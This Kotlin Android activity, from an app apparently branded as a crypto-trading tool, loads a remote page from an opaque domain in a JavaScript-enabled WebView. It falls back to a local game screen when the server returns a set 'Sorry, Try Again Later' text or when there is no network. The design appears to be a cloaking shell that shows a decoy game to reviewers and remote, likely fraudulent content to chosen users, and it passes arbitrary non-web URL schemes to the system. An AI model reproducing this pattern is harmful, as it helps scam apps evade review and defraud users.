package immediate.crypto.trading.quantum

import android.annotation.SuppressLint
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.webkit.CookieManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar

class MainActivity : AppCompatActivity() {
    private lateinit var ai_wb: WebView
    private lateinit var ai_pb: ProgressBar


    override fun onCreate(savedInstanceState: Bundle?) {
        supportActionBar?.hide()
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        ai_wb = findViewById(R.id.wb_ai)
        ai_pb = findViewById(R.id.pb_ai)
        setupWebView()
        if (isNetworkAvailable()) {
            ai_wb.loadUrl("https://vankoz.site/1NHqbqgc")
        } else {
            redirectToGameActivity()
        }
    }

    override fun onResume() {
        super.onResume()
        ai_wb.onResume()
    }

    override fun onPause() {
        super.onPause()
        ai_wb.onPause()
    }

    override fun onDestroy() {
        super.onDestroy()
        ai_wb.destroy()
    }

    override fun onBackPressed() {
        if (ai_wb.canGoBack()) {
            ai_wb.goBack()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        val webSettings: WebSettings = ai_wb.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.builtInZoomControls = true

        ai_wb.webChromeClient = WebChromeClient()
        ai_wb.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                CookieManager.getInstance().flush()
                super.onPageFinished(view, url)
                val body = ai_wb.evaluateJavascript("document.body.innerText") {
                    if (it == "\"Sorry, Try Again Later\"") {
                        redirectToGameActivity()
                    }
                }
                ai_pb.visibility = ProgressBar.GONE
            }

            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    return false
                }

                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                startActivity(intent)
                return true
            }
        }
        val cookieManager: CookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        cookieManager.setAcceptThirdPartyCookies(ai_wb, true)
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        val capabilities = connectivityManager.getNetworkCapabilities(network)
        return capabilities != null &&
                (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR))
    }

    private fun redirectToGameActivity() {
        startActivity(Intent(this, LoadAi::class.java))
        finish()
    }
}